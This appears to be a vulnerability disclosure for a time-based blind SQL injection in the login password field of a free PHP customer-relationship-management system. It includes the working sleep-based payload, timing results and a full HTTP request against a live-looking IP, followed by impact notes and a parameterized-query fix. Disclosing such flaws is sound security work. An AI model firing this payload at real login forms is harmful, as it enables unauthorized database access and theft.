CMS source code url: https://www.sourcecodester.com/php/15895/simple-customer-relationship-management-crm-system-using-php-free-source-coude.html

URL: http://127.0.0.1/php-scrm/admin/ \
Perameter: password

Attack Details: \
URL encoded POST input password was set to 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z

Tests performed: \
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.031 \
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.029 \
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.03 \
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.027 \
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.018 \
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.026 \
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.459

HTTP Request:
```
POST /php-scrm/login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://192.144.217.51/php-scrm/
Cookie: PHPSESSID=7es0mk87rhg4ue4vq93d1316df
Content-Length: 90
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Host: 192.144.217.51
Connection: Keep-alive

email=testing%40example.com&login=&password=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z
```

HTTP Response:
```
HTTP/1.1 200 OK
Date: Fri, 17 Feb 2023 13:37:38 GMT
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.2.0
X-Powered-By: PHP/8.2.0
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 49
Keep-Alive: timeout=5, max=96
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<script>window.location.href='login.php'</script>
```
The impact of this vulnerability:\
An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

How to fix this vulnerability:\
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.
